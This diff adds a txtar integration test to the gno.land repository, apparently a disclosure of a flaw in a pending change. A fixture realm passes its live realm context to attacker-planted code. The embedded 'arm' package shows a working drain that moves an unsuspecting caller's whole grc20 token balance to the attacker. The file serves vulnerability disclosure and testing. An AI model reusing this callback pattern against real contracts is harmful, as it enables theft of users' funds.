@@ -1,0 +1,119 @@
+# The genesis fixture realm r/tests/grc20_user_teller_leak hands its own live
+# `cur` to caller-supplied code, and with a public Token.UserTeller() that value
+# now also carries the grc20 spend authority of whoever called the fixture. Any
+# account arms it once; the next user who calls the fixture directly loses every
+# registered token they hold.
+# Measured at 16f54a89c: mallory arms the fixture, alice makes one direct
+# `Transfer` call naming herself and 1 token, and her 1000000 LEAK ends at
+# mallory's realm.
+#
+# Run: from a local clone of gnolang/gno:
+# gh pr checkout 6123 -R gnolang/gno
+# cp grc20_leak_fixture_user_drain.txtar gno.land/pkg/integration/testdata/
+# go test -v -run 'TestTestdata/grc20_leak_fixture_user_drain' ./gno.land/pkg/integration/
+# rm gno.land/pkg/integration/testdata/grc20_leak_fixture_user_drain.txtar
+
+loadpkg gno.land/p/demo/tokens/grc20
+loadpkg gno.land/r/demo/defi/grc20reg
+loadpkg gno.land/r/tests/grc20_user_teller_leak
+loadpkg gno.land/r/test/leaktok $WORK/leaktok
+loadpkg gno.land/r/test/arm $WORK/arm
+
+adduser alice
+adduser mallory
+
+gnoland start
+
+gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+gnokey maketx send -send 50000000ugnot -to $mallory_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+
+gnokey maketx call -pkgpath gno.land/r/test/leaktok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+gnokey query vm/qeval --data "gno.land/r/test/leaktok.BalanceOf(\"$alice_user_addr\")"
+stdout '1000000 int64'
+
+# Store is unauthenticated: mallory plants her own implementation.
+gnokey maketx call -pkgpath gno.land/r/test/arm -func Plant -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test mallory
+stdout OK
+
+# alice makes one direct MsgCall on the genesis fixture, naming her own address
+# and 1 token. The arguments are ignored.
+gnokey maketx call -pkgpath gno.land/r/tests/grc20_user_teller_leak -func Transfer -args $alice_user_addr -args 1 -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+
+gnokey query vm/qeval --data "gno.land/r/test/leaktok.BalanceOf(\"$alice_user_addr\")"
+stdout '0 int64'         # IS:     the planted callback spends the caller's balance
+# stdout '1000000 int64' # SHOULD: a fixture realm never hands its frame to an implementer it does not control
+gnokey query vm/qeval --data "gno.land/r/test/arm.Take()"
+stdout '1000000 int64'
+
+-- leaktok/gnomod.toml --
+module = "gno.land/r/test/leaktok"
+gno = "0.9"
+
+-- leaktok/leaktok.gno --
+package leaktok
+
+import (
+	"gno.land/p/demo/tokens/grc20"
+	"gno.land/r/demo/defi/grc20reg"
+)
+
+var (
+	token *grc20.Token
+	adm   *grc20.PrivateLedger
+)
+
+func init(cur realm) {
+	token, adm = grc20.NewToken("LeakTok", "LEAK", 4, 0, cur)
+	grc20reg.Register(cross(cur), token, "")
+}
+
+func Faucet(cur realm) {
+	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
+		panic(err)
+	}
+}
+
+func BalanceOf(owner address) int64 { return token.BalanceOf(owner) }
+
+-- arm/gnomod.toml --
+module = "gno.land/r/test/arm"
+gno = "0.9"
+
+-- arm/arm.gno --
+package arm
+
+import (
+	"chain"
+
+	"gno.land/r/demo/defi/grc20reg"
+	"gno.land/r/tests/grc20_user_teller_leak"
+)
+
+const key = "gno.land/r/test/leaktok.LEAK"
+
+type spy struct{}
+
+// Transfer satisfies the fixture's teller interface. rlm arrives as the
+// fixture's own live cur, whose Previous() is the EOA that called the fixture,
+// so UserTeller resolves that EOA as the actor.
+func (s *spy) Transfer(_ int, rlm realm, to address, amount int64) error {
+	tok := grc20reg.MustGet(key)
+	victim := rlm.Previous().Address()
+	bal := tok.BalanceOf(victim)
+	if bal == 0 {
+		return nil
+	}
+	return tok.UserTeller().Transfer(0, rlm, chain.PackageAddress("gno.land/r/test/arm"), bal)
+}
+
+func Plant(cur realm) {
+	grc20_user_teller_leak.Store(cross(cur), &spy{})
+}
+
+func Take() int64 {
+	return grc20reg.MustGet(key).BalanceOf(chain.PackageAddress("gno.land/r/test/arm"))
+}
